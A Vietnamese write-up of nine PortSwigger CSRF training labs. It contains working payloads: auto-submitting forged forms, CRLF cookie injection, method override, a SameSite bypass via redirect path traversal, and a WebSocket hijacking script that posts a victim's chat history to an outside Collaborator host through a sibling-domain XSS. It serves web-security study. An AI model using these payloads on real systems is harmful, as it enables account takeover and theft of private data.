# CSRF lab

### 1. CSRF vulnerability with no defenses
https://portswigger.net/web-security/csrf/lab-no-defenses

Đăng nhập vào `wiener:peter` sau đó thay đổi email, do việc này không có csrf token cũng không có xác thực mật khẩu nên ta tạo form rồi gửi cho `carlos`

---

### 2. CSRF where token validation depends on request method
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method

Context: ở đây khi dùng POST để đổi email thì cần có thêm `csrf` token, nhưng khi đổi sang GET thì không cần `csrf` token

![alt text](image.png)

![alt text](image-1.png)

Từ đây ta tạo csrf form để gửi đi. 

---

### 3. CSRF where token validation depends on token being present
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present

Ở bài này việc xóa đi csrf token trong POST không ảnh hưởng đến kết quả.

![alt text](image-2.png)

Từ đây ta tạo payload.

---

### 4. CSRF where token is not tied to user session
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session

Context: 

1. Csrf token ảnh hưởng đến xử lý, không thể xóa, hay sử dụng trùng nhau
2. Email trùng với tài khoản khác sẽ không hợp lệ, dẫn đến các lần thay đổi sau đó sẽ ko được do csrf token không thay đổi mỗi phiên đăng nhập nên chỉ sử dụng được 1 lần

Nhưng ở đây khi lấy csrf token của phiên đăng nhập của Carlos để gửi với change-email của weiner thì vẫn thành công do chưa sử dụng lần nào và nó tạo ra cho 1 phiên.\
![alt text](image-3.png)

![alt text](image-4.png)

![alt text](image-5.png)

Từ đây ta đăng nhập 1 tài khoản và lấy csrf token cho phiên đó để gửi cho victim.

---

### 5. CSRF where token is tied to non-session cookie
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie

Context:

1. Khi update thì sẽ có cookie `csrfKey` và `csrf` token ở form, và 2 cái này tồn tại theo cặp, dù đổi người dùng thì nếu thay đổi cả 2 giá trị này theo cặp thì vẫn có thể request thành công. 

=> Ta cần đổi cookie `csrfKey` của victim và rồi từ đó có thể dùng `csrf` token của mình

Mặt khác, khi dùng chức năng search, thông tin sẽ được phản hồi ở `Set-cookie` ở response, vậy nên ta sẽ cố gắng chèn thêm `Set-cookie` ở response bằng cách dùng `%0d%0a` là `\r\n`:

![alt text](image-6.png)

Payload: 

```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0aec003503cf58e580948f3d0053007b.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="absssa&#64;gmail&#46;net" />
        <input type="hidden" name="csrf" value="4ZTQjukf9UX8toqgbTThbm8F16k9F2jO" />
        <input type="submit" value="Submit request" />
    </form>


    <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

---

### 6. CSRF where token is duplicated in cookie
https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie

Context: Bài này `csrf` token sẽ trùng với `csrf` cookie

Vẫn tương tự bài trước thì `Search` sẽ được thể hiện qua cookie

Ta sẽ chỉ cần tạo 1 fake csrf token và csrf cookie giống nhau ở phía victim:

Payload:

```js
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0afa004403c0e408818f0cbd00de0051.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="absssa&#64;gmail&#46;net" />
        <input type="hidden" name="csrf" value="XBeN2PtpvYuFiueM15QTTYjQu37nWczz" />
        <input type="submit" value="Submit request" />
    </form>


    <img src="https://0afa004403c0e408818f0cbd00de0051.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=XBeN2PtpvYuFiueM15QTTYjQu37nWczz%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```

---

### 7. SameSite Lax bypass via method override
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override

Context: Cần bypass `Samesite: Lax`

![alt text](image-7.png)

Ở phần change-email thì không có sự xuất hiện của csrf token, nhưng khi attack theo kiểu truyền thống thì không thành công, có thể do cần thêm cookie để xác nhận. 

![alt text](image-8.png)

Mặt khác, cookie được tạo và không đặt `Samesite` nên mặc định nó là `Lax`. Với Lax cookie chỉ được include vào request khi đó là `GET` và đến 1 URL cấp cao hơn. Hoặc điều hướng từ trang gốc đến 1 trang redirect

Nhưng khi chuyển qua `GET` nó đang không cho phép request:\
![alt text](image-9.png)

Thêm parameter `_method=POST` (ghi đè method) thì nó thành công:\
![alt text](image-10.png)

Payload: 
```js
<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```

Tham khảo cách khác để ghi đè method: https://www.sidechannel.blog/en/http-method-override-what-it-is-and-how-a-pentester-can-use-it/

---

### 8. SameSite Strict bypass via client-side redirect

https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect

Với cookie được đặt `SameSite=Strict` thì nó chỉ gắn cookie khi chuyển hướng trong trang, ko gắn khi liên trang hay kể cả khác scheme

Vì vậy cần tìm 1 chuyển hướng từ trang gốc đến chính trang đó, và ở đây mình sẽ cố đâm vào cái url chuyển hướng thứ 2, vì nó sẽ mang cookie theo

Ta tìm được 1 trang chuyển hướng khi post comment ta nhận được path: `/post/comment/confirmation?postId=x`

Sau đó nó được chuyển hướng về postId `x`

Thêm vào đó ta có thể thâu tóm path này để path traversal đến bất kì trang nào:

![alt text](image-11.png)

Mặt khác ta có thể change email bằng GET thay vì POST 

```http
GET /my-account/change-email?email=abcd%40gmail.net&submit=1 HTTP/2
```

Payload:

```js
<script>
    document.location = "https://0a06002304ad4b2082303ecf00390045.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
</script>
```

Gửi cho victim

Khi victim truy cập vào link, nó sẽ redirect đến trang này và vì cùng site nên nó vẫn mang theo cookie victim

---

### 9. SameSite Strict bypass via sibling domain

https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain

Khi vào `/chat` ta thấy không có token nào để xác định cá nhân đang yêu cầu

![alt text](image-12.png)

Vào `WebSockets history` ta thấy khi refresh chat browser sẽ send `READY` cho server và các gói tin tiếp theo là lịch sử trước đó 

![alt text](image-13.png)

Dùng `Collaborator` tạo script:

```js
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

![alt text](image-14.png)

Và thử xem exploit thì ta sẽ nhận được gói tin ở `Collaborator` chứng tỏ ta đã kích hoạt được để nó gửi payload ra, thế nhưng ta chỉ lấy được 1 phiên mới, ko lấy được phiên cũ ta vừa chat

![alt text](image-15.png)

Qua tab `History` ta thấy `GET /chat` không được gửi cùng cookie, vì cookie khi server đã có `SameSite=Strict`

![alt text](image-16.png)

Điều này bắt buộc phải có thêm 1 lỗ hổng khác

Ta thấy rằng có 1 request cho phép `Access-Control-Allow-Origin` và domain lấy là: `cms-YOUR-LAB-ID.web-security-academy.net`

![alt text](image-17.png)

Ta vào thử domain này:

![alt text](image-18.png)

Login username bất kì ta nhận được:

![alt text](image-19.png)

Thử với username `<script>alert(1)</script>` ta nhận được alert:

![alt text](image-20.png)

Đổi method `POST` thành `GET` và thử lại ta thấy vẫn có thể kích hoạt XSS

![alt text](image-21.png)

Ta sẽ tận dụng domain này vì domain này được allow nên có thể được mang theo cookie

Bây giờ đoạn script khai thác lúc nãy ta sẽ encode đưa vào username:

```js
<script>
    var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

![alt text](image-22.png)

Còn ở exploit server ta sẽ thêm đoạn script mà đoạn username sẽ là đoạn encode script ở trên:

```js
<script>
    document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
</script>
```

![alt text](image-23.png)

Để khi người dùng vào url này nó sẽ từ domain cms kích hoạt XSS nên sẽ tạo `/chat` cho domain gốc, do allow origin nên nó được mang theo cookie, điều này giúp ta lấy được lịch sử đoạn chat theo cookie victim

![alt text](image-24.png)

---

Thường khi không cấp chế độ gì cho cookie thì nó sẽ tự động được gắn là `Lax` và không được gửi với POST cho chéo trang

nhưng vì để không phá vỡ cơ chế SSO, trong 120s đầu tiên cấp cookie nó vẫn có thể dùng với POST, và đây là khoảng thời gian mà cookie không ở chế độ `Lax`
















